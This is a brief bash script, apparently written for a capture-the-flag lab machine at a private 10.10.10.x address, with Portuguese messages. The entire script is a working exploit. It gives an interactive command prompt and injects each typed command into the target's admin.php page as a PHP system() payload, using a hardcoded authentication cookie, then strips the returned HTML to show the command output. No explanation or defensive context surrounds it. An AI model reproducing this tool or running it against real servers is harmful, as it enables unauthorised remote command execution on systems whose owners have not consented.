#!/bin/bash

function def_handler(){
	echo -e "\n\n[!]Saindo...\n\n"
	exit 1
}

# Ctrl + C
trap def_handler INT

# Variable_Global
main_url="http://10.10.10.27/admin.php"

while true; do
	echo -n "#> " && read -r command
	curl -s -G "$main_url" --data-urlencode "html=<?php system('$command');?>" --cookie "adminpowa=noonecares" | grep -i "\/body" -A 500 | grep -i -v "\/body"; echo
done
